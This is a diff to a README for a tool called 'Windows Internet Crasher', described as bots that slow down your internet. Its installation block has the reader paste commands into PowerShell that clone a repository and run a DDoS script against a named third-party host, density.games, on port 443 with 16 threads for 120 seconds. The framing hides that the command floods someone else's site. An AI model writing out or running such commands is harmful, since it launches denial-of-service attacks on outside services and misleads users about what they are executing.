@@ -1,8 +1,9 @@
 # Windows Internet Crasher
 This script when run executes bots that slow down your internet
-## Instalation
+## Instalation Paste this into Powershell
 clone this repo at 
 ```text
+$Host.UI.RawUI.ForegroundColor = "Green"
 git clone https://github.com/CalcSolver/crasher.git
 cd crasher
 python ddos_script.py --host density.games --port 443 --threads 16 --duration 120
